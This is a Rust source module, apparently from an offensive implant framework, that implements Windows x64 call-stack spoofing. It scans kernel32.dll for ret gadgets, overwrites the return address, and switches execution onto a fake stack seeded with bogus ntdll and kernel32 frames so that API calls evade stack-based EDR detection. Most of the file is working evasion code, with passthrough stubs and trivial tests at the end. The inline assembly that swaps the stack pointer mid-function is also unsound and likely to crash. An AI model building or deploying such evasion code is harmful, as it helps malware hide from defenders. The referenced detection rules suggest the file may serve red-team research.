//! Stack spoofing — Phase 4 OPSEC
//!
//! Manipulates call stack to hide true origin of API calls.
//! Detection rules: wiki/detection/yara/kraken_opsec.yar

#[cfg(target_os = "windows")]
use core::ffi::c_void;

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;

/// Execute a closure with spoofed return address
///
/// Replaces the current return address with one from a legitimate
/// Windows DLL (kernel32.dll) to evade stack-based detection.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn call_with_spoofed_stack<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    // Get legitimate return address from kernel32
    let fake_return = get_legitimate_return_address();
    if fake_return == 0 {
        return f();
    }

    // Save real return address
    let real_return: usize;
    core::arch::asm!(
        "mov {}, [rsp]",
        out(reg) real_return,
    );

    // Replace with fake
    core::arch::asm!(
        "mov [rsp], {}",
        in(reg) fake_return,
    );

    // Execute function
    let result = f();

    // Restore real return address
    core::arch::asm!(
        "mov [rsp], {}",
        in(reg) real_return,
    );

    result
}

/// Find a legitimate return address in kernel32.dll
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn get_legitimate_return_address() -> usize {
    let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
    if kernel32 == 0 {
        return 0;
    }

    let base = kernel32 as *const u8;

    // Search for a ret gadget preceded by stack adjustment
    // Pattern: add rsp, XX; ret (48 83 C4 XX C3)
    for offset in 0x1000..0x50000 {
        let addr = base.add(offset);
        let bytes = core::slice::from_raw_parts(addr, 5);

        // add rsp, imm8; ret
        if bytes[0] == 0x48 && bytes[1] == 0x83 && bytes[2] == 0xC4 && bytes[4] == 0xC3 {
            return addr as usize;
        }

        // pop rbx; ret (common epilogue)
        if bytes[0] == 0x5B && bytes[1] == 0xC3 {
            return addr as usize;
        }
    }

    // Fallback to module base + reasonable offset
    (kernel32 as usize) + 0x1000
}

/// Execute function on a separate fake stack
///
/// Allocates a new stack region, sets up fake return frames
/// pointing to legitimate Windows code, then executes the function.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn execute_with_fake_stack<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    const STACK_SIZE: usize = 0x10000;

    // Allocate fake stack
    let fake_stack = VirtualAlloc(
        core::ptr::null(),
        STACK_SIZE,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) as *mut u8;

    if fake_stack.is_null() {
        return f();
    }

    // Set up stack (grows downward) with alignment
    let stack_top = fake_stack.add(STACK_SIZE - 64);

    // Build fake frames pointing to legitimate code
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as usize;
    let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr()) as usize;

    // Write fake return addresses
    if ntdll != 0 {
        *(stack_top.sub(8) as *mut usize) = ntdll + 0x1000; // Fake ntdll return
    }
    if kernel32 != 0 {
        *(stack_top.sub(16) as *mut usize) = kernel32 + 0x1000; // Fake kernel32 return
    }

    // Save old RSP and switch to fake stack
    let old_rsp: usize;
    core::arch::asm!(
        "mov {}, rsp",
        out(reg) old_rsp,
    );

    core::arch::asm!(
        "mov rsp, {}",
        in(reg) stack_top.sub(24),
    );

    let result = f();

    // Restore real stack
    core::arch::asm!(
        "mov rsp, {}",
        in(reg) old_rsp,
    );

    // Free fake stack
    VirtualFree(fake_stack as *mut c_void, 0, MEM_RELEASE);

    result
}

// Non-x64 Windows: passthrough
#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
pub fn call_with_spoofed_stack<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    f()
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
pub fn execute_with_fake_stack<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    f()
}

// Non-Windows: passthrough
#[cfg(not(target_os = "windows"))]
#[allow(dead_code)]
pub fn call_with_spoofed_stack<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    f()
}

#[cfg(not(target_os = "windows"))]
#[allow(dead_code)]
pub fn execute_with_fake_stack<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    f()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_call_with_spoofed_stack_passthrough() {
        let result = call_with_spoofed_stack(|| 42);
        assert_eq!(result, 42);
    }

    #[test]
    fn test_execute_with_fake_stack_passthrough() {
        let result = execute_with_fake_stack(|| "hello");
        assert_eq!(result, "hello");
    }
}
